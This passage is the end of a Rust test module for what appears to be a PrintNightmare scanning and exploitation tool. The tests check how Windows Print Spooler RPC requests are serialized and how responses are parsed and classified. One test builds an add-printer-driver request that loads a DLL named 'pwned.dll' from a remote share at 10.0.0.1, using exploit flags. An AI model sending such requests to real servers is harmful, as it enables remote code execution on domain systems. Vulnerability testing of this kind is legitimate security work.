            "\\\\10.0.0.1\\share\\pwned.dll",
            Some("C:\\Windows\\System32\\kernelbase.dll"),
            0x8014,
        );
        // pName: refid(1) + WSTR("\\dc1" = 5 chars + NUL = 6 units)
        assert_eq!(&stub[0..4], &1u32.to_le_bytes());
        assert_eq!(u32::from_le_bytes(stub[4..8].try_into().unwrap()), 6);
        assert_eq!(u32::from_le_bytes(stub[8..12].try_into().unwrap()), 0);
        assert_eq!(u32::from_le_bytes(stub[12..16].try_into().unwrap()), 6);
        // last dword in stub == flags
        let flags_start = stub.len() - 4;
        assert_eq!(
            u32::from_le_bytes(stub[flags_start..].try_into().unwrap()),
            0x8014
        );
        // pConfigFile unique pointer carries referent id 9
        // (1 pName + 1 container + 1 info + 5 strings). The config blob is
        // refid(4) + counts(12) + 36 units * 2 bytes = 88 bytes.
        let cfg_units = 36u32; // "C:\Windows\System32\kernelbase.dll" + NUL
        let cfg_blob = 4 + 12 + (cfg_units * 2) as usize;
        let cfg_start = flags_start - cfg_blob;
        assert_eq!(
            u32::from_le_bytes(stub[cfg_start..cfg_start + 4].try_into().unwrap()),
            9
        );
        // The container referent id must be non-zero.
        assert!(stub.iter().any(|b| *b != 0));
    }

    #[test]
    fn test_add_stub_null_config_file() {
        let stub = build_add_printer_driver_ex_stub(
            "\\\\dc1",
            "d",
            "Windows x64",
            "\\\\h\\s\\d.dll",
            "\\\\h\\s\\d.dll",
            None,
            0x8014,
        );
        // With `None`, the pConfigFile unique pointer serializes as refid 0.
        let flags_start = stub.len() - 4;
        assert_eq!(
            u32::from_le_bytes(stub[flags_start - 4..flags_start].try_into().unwrap()),
            0
        );
    }

    #[test]
    fn test_driver_container_field_order() {
        let mut refid = 1u32;
        let container = build_driver_container(
            "d",
            "Windows x64",
            "\\\\h\\d.dll",
            "\\\\h\\d.dll",
            "",
            &mut refid,
        );
        // container referent id, then cUnits = 1
        assert_eq!(u32::from_le_bytes(container[0..4].try_into().unwrap()), 1);
        assert_eq!(u32::from_le_bytes(container[4..8].try_into().unwrap()), 1);
        // pDrivers referent id, then cVersion = 3
        assert_eq!(u32::from_le_bytes(container[12..16].try_into().unwrap()), 3);
        // refid counter advanced: pName + container + info + 5 strings
        assert_eq!(refid, 8);
    }

    #[test]
    fn test_check_stub_shape() {
        let stub = build_check_stub("\\\\dc1");
        // flags == 0 for check mode
        let flags_start = stub.len() - 4;
        assert_eq!(
            u32::from_le_bytes(stub[flags_start..].try_into().unwrap()),
            0
        );
        // pName is the server UNC "\\dc1" (5 chars + NUL = 6 units)
        assert_eq!(u32::from_le_bytes(stub[4..8].try_into().unwrap()), 6);
        assert_eq!(u32::from_le_bytes(stub[8..12].try_into().unwrap()), 0);
        assert_eq!(u32::from_le_bytes(stub[12..16].try_into().unwrap()), 6);
    }

    #[test]
    fn test_enum_stub_round1() {
        let stub = build_enum_printer_drivers_stub_round1("\\\\dc1", "Windows x64");
        // pName unique pointer: refid=1, then counts(12)+data(12) at 4..28
        assert_eq!(u32::from_le_bytes(stub[0..4].try_into().unwrap()), 1);
        // pEnvironment unique pointer refid=2 (sequential after pName=1) at 28
        assert_eq!(u32::from_le_bytes(stub[28..32].try_into().unwrap()), 2);
        // level == 2 at 68 (24-byte env blob at 32..68)
        assert_eq!(u32::from_le_bytes(stub[68..72].try_into().unwrap()), 2);
        // pDrivers referent NULL at 72..76
        assert_eq!(u32::from_le_bytes(stub[72..76].try_into().unwrap()), 0);
        // cbBuf == 0 as final dword at 76..80
        assert_eq!(u32::from_le_bytes(stub[76..80].try_into().unwrap()), 0);
    }

    #[test]
    fn test_enum_stub_round2() {
        let stub = build_enum_printer_drivers_stub_round2("\\\\dc1", "Windows x64", 64);
        // cbBuf == 64 as last dword
        let tail = stub.len() - 4;
        assert_eq!(u32::from_le_bytes(stub[tail..].try_into().unwrap()), 64);
        // max_count == 64 in the byte array
        assert_eq!(
            u32::from_le_bytes(stub[tail - 68..tail - 64].try_into().unwrap()),
            64
        );
        // non-null pDrivers referent
        assert_eq!(
            u32::from_le_bytes(stub[tail - 72..tail - 68].try_into().unwrap()),
            1
        );
    }

    #[test]
    fn test_delete_stub_shape() {
        let stub = build_delete_printer_driver_ex_stub("\\\\dc1", "Windows x64", "evil", 0, 3);
        assert_eq!(u32::from_le_bytes(stub[0..4].try_into().unwrap()), 1);
        // final two dwords: delete_flag=0 then version=3
        let version_start = stub.len() - 4;
        let flag_start = stub.len() - 8;
        assert_eq!(
            u32::from_le_bytes(stub[flag_start..version_start].try_into().unwrap()),
            0
        );
        assert_eq!(
            u32::from_le_bytes(stub[version_start..].try_into().unwrap()),
            3
        );
    }

    #[test]
    fn test_classify_add_status() {
        assert_eq!(
            classify_add_status(Some(ERROR_INVALID_PARAMETER)),
            PrintNightmareVerdict::LikelyVulnerable
        );
        assert_eq!(
            classify_add_status(Some(0)),
            PrintNightmareVerdict::LikelyVulnerable
        );
        assert_eq!(
            classify_add_status(Some(RPC_E_ACCESS_DENIED)),
            PrintNightmareVerdict::PatchedOrBlocked
        );
        assert_eq!(
            classify_add_status(Some(STATUS_ACCESS_DENIED)),
            PrintNightmareVerdict::PatchedOrBlocked
        );
        assert_eq!(
            classify_add_status(Some(ERROR_ACCESS_DENIED)),
            PrintNightmareVerdict::PatchedOrBlocked
        );
        assert_eq!(
            classify_add_status(Some(0xC0000010)),
            PrintNightmareVerdict::Unknown
        );
        assert_eq!(classify_add_status(None), PrintNightmareVerdict::Unknown);
    }

    #[test]
    fn test_is_rpc_fault_and_tail_status() {
        // Fault PDU with status at 24
        let mut fault = Vec::new();
        fault.extend_from_slice(&[5, 0, 3, 0x03]);
        fault.extend_from_slice(&[0x10, 0, 0, 0]);
        fault.extend_from_slice(&12u16.to_le_bytes());
        fault.extend_from_slice(&0u16.to_le_bytes());
        fault.extend_from_slice(&1u32.to_le_bytes()); // call id
        fault.extend_from_slice(&0u32.to_le_bytes()); // alloc hint
        fault.extend_from_slice(&0u16.to_le_bytes()); // ctx
        fault.extend_from_slice(&0u16.to_le_bytes()); // cancel
        fault.extend_from_slice(&0xC000_0022u32.to_le_bytes()); // status at 24
        assert_eq!(is_rpc_fault(&fault), Some(0xC000_0022));
        assert_eq!(tail_status(&fault), Some(0xC000_0022));

        assert_eq!(is_rpc_fault(&[5, 0, 2, 0]), None);
        assert_eq!(tail_status(&[0u8; 24]), None);
    }

    #[test]
    fn test_parse_enum_round1_success() {
        let mut pdu = vec![5, 0, 2, 0x03];
        pdu.extend_from_slice(&[0x10, 0, 0, 0]);
        pdu.extend_from_slice(&24u16.to_le_bytes());
        pdu.extend_from_slice(&0u16.to_le_bytes());
        pdu.extend_from_slice(&1u32.to_le_bytes());
        pdu.extend_from_slice(&16u32.to_le_bytes()); // alloc hint
        pdu.extend_from_slice(&0u16.to_le_bytes()); // p_cont_id
        pdu.extend_from_slice(&0u16.to_le_bytes()); // cancel count
        // stub: null pDrivers + pcbNeeded + cReturned + ErrorCode
        pdu.extend_from_slice(&0u32.to_le_bytes());
        pdu.extend_from_slice(&8192u32.to_le_bytes());
        pdu.extend_from_slice(&17u32.to_le_bytes());
        pdu.extend_from_slice(&ERROR_INSUFFICIENT_BUFFER.to_le_bytes());
        let probe = parse_enum_round1(&pdu).expect("should parse");
        assert_eq!(probe.pcb_needed, 8192);
        assert_eq!(probe.c_returned, 17);
        assert_eq!(probe.error_code, ERROR_INSUFFICIENT_BUFFER);
    }

    #[test]
    fn test_parse_enum_round1_rejects_fault_and_short() {
        assert_eq!(parse_enum_round1(&[0u8; 24]), None);
        let mut pdu = vec![5, 0, 3, 0x03];
        pdu.extend_from_slice(&[0u8; 20]);
        pdu.extend_from_slice(&RPC_E_ACCESS_DENIED.to_le_bytes());
        assert_eq!(parse_enum_round1(&pdu), None);
    }

    #[test]
    fn test_parse_drivers_payload_roundtrip() {
        // Build a payload in the same layout the parser expects:
        // array header + N×24 struct + 5 strings per driver.
        let mut payload = Vec::new();
        payload.extend_from_slice(&1u32.to_le_bytes()); // max
        payload.extend_from_slice(&0u32.to_le_bytes()); // offset
        payload.extend_from_slice(&1u32.to_le_bytes()); // actual
        payload.extend_from_slice(&3u32.to_le_bytes()); // cVersion
        for rid in 1u32..=5 {
            payload.extend_from_slice(&rid.to_le_bytes());
        }
        let name = "MS PDF".to_string();
        payload.extend_from_slice(&ndr_conformant_string(&name));
        payload.extend_from_slice(&ndr_conformant_string("Windows x64"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\Windows\\System32\\ps5ui.dll"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\Windows\\System32\\ps5ui.dll"));
        payload.extend_from_slice(&ndr_conformant_string(
            "C:\\Windows\\System32\\kernelbase.dll",
        ));

        let drivers = parse_drivers_payload(&payload);
        assert_eq!(drivers.len(), 1);
        assert_eq!(drivers[0].c_version, 3);
        assert_eq!(drivers[0].name.as_deref(), Some("MS PDF"));
        assert_eq!(drivers[0].environment.as_deref(), Some("Windows x64"));
        assert_eq!(
            drivers[0].driver_path.as_deref(),
            Some("C:\\Windows\\System32\\ps5ui.dll")
        );
        assert_eq!(
            drivers[0].data_file.as_deref(),
            Some("C:\\Windows\\System32\\ps5ui.dll")
        );
        assert_eq!(
            drivers[0].config_file.as_deref(),
            Some("C:\\Windows\\System32\\kernelbase.dll")
        );
    }

    #[test]
    fn test_parse_drivers_payload_multi() {
        // Two drivers: parse the second record's strings as well.
        let mut payload = Vec::new();
        payload.extend_from_slice(&2u32.to_le_bytes());
        payload.extend_from_slice(&0u32.to_le_bytes());
        payload.extend_from_slice(&2u32.to_le_bytes());
        for cv in [3u32, 3u32] {
            payload.extend_from_slice(&cv.to_le_bytes());
            for rid in 1u32..=5 {
                payload.extend_from_slice(&rid.to_le_bytes());
            }
        }
        payload.extend_from_slice(&ndr_conformant_string("A"));
        payload.extend_from_slice(&ndr_conformant_string("Windows x64"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\a.dll"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\a.dll"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\cfg.dll"));
        payload.extend_from_slice(&ndr_conformant_string("B"));
        payload.extend_from_slice(&ndr_conformant_string("Windows x64"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\b.dll"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\b.dll"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\cfg2.dll"));

        let drivers = parse_drivers_payload(&payload);
        assert_eq!(drivers.len(), 2);
        assert_eq!(drivers[0].name.as_deref(), Some("A"));
        assert_eq!(drivers[1].name.as_deref(), Some("B"));
        assert_eq!(drivers[1].config_file.as_deref(), Some("C:\\cfg2.dll"));
    }

    #[test]
    fn test_parse_drivers_payload_malformed() {
        assert!(parse_drivers_payload(&[]).is_empty());
        assert!(parse_drivers_payload(&[0u8; 5]).is_empty());
        // actual_count larger than the buffer: no over-read crash
        let mut payload = Vec::new();
        payload.extend_from_slice(&10u32.to_le_bytes());
        payload.extend_from_slice(&0u32.to_le_bytes());
        payload.extend_from_slice(&500u32.to_le_bytes());
        payload.extend_from_slice(&[0u8; 24]);
        assert!(parse_drivers_payload(&payload).is_empty());
    }

    #[test]
    fn test_parse_enum_round2() {
        // round-2 stub: refid(1) + max_count + payload + tail probe
        let mut payload = Vec::new();
        payload.extend_from_slice(&1u32.to_le_bytes());
        payload.extend_from_slice(&0u32.to_le_bytes());
        payload.extend_from_slice(&1u32.to_le_bytes());
        payload.extend_from_slice(&3u32.to_le_bytes());
        for rid in 1u32..=5 {
            payload.extend_from_slice(&rid.to_le_bytes());
        }
        payload.extend_from_slice(&ndr_conformant_string("DriverX"));
        payload.extend_from_slice(&ndr_conformant_string("Windows x64"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\path1.dll"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\path2.dll"));
        payload.extend_from_slice(&ndr_conformant_string("C:\\cfg.dll"));
        let max_count = payload.len() as u32;

        let mut stub = Vec::new();
        stub.extend_from_slice(&1u32.to_le_bytes()); // refid
        stub.extend_from_slice(&max_count.to_le_bytes());
        stub.extend_from_slice(&payload);
        stub.extend_from_slice(&768u32.to_le_bytes()); // pcbNeeded
        stub.extend_from_slice(&1u32.to_le_bytes()); // cReturned
        stub.extend_from_slice(&0u32.to_le_bytes()); // ErrorCode

        let mut pdu = vec![5, 0, 2, 0x03];
        pdu.extend_from_slice(&[0x10, 0, 0, 0]);
        pdu.extend_from_slice(&(24 + stub.len() as u16).to_le_bytes());
        pdu.extend_from_slice(&0u16.to_le_bytes());
        pdu.extend_from_slice(&1u32.to_le_bytes());
        pdu.extend_from_slice(&(stub.len() as u32).to_le_bytes()); // alloc hint
        pdu.extend_from_slice(&0u16.to_le_bytes()); // p_cont_id
        pdu.extend_from_slice(&0u16.to_le_bytes()); // cancel count
        pdu.extend_from_slice(&stub);
        // The 24-byte header is complete now (stub starts at 24).

        let (drivers, probe) = parse_enum_round2(&pdu).expect("should parse");
        assert_eq!(probe.error_code, 0);
        assert_eq!(probe.pcb_needed, 768);
        assert_eq!(drivers.len(), 1);
        assert_eq!(drivers[0].name.as_deref(), Some("DriverX"));
        assert_eq!(drivers[0].config_file.as_deref(), Some("C:\\cfg.dll"));
    }

    #[test]
    fn test_parse_enum_round2_rejects_null_refid() {
        let mut stub = Vec::new();
        stub.extend_from_slice(&0u32.to_le_bytes());
        stub.extend_from_slice(&[0u8; 20]);
        assert!(parse_enum_round2(&stub).is_none());
    }

    #[test]
    fn test_result_serialization_shape() {
        let res = PrintNightmareResult {
            target: "dc1".to_string(),
            mode: PrintNightmareMode::Add,
            success: true,
            status_code: Some(0),
            message: "ok".to_string(),
        };
        let debug_string = format!("{res:?}");
        assert!(debug_string.contains("dc1"));
        assert!(debug_string.contains("Add"));
    }

    #[test]
    fn test_driver_info_serde() {
        let d = PrintDriverInfo {
            c_version: 3,
            name: Some("x".to_string()),
            environment: Some("Windows x64".to_string()),
            driver_path: Some("C:\\a.dll".to_string()),
            data_file: Some("C:\\a.dll".to_string()),
            config_file: Some("C:\\cfg.dll".to_string()),
        };
        let json = serde_json::to_string(&d).expect("serialize");
        let back: PrintDriverInfo = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(back, d);
    }

    #[test]
    fn test_read_utf16_at_bounds() {
        let mut buf = Vec::new();
        buf.extend_from_slice(
            &"AAA"
                .encode_utf16()
                .chain(std::iter::once(0))
                .flat_map(u16::to_le_bytes)
                .collect::<Vec<_>>(),
        );
        assert_eq!(buf.len(), 8);
        let mut cursor = 0usize;
        let s = read_utf16_at(&buf, &mut cursor).expect("string");
        assert_eq!(s, "AAA");
        assert!(cursor >= buf.len());
        assert_eq!(read_utf16_at(&buf, &mut cursor), None);
    }
}
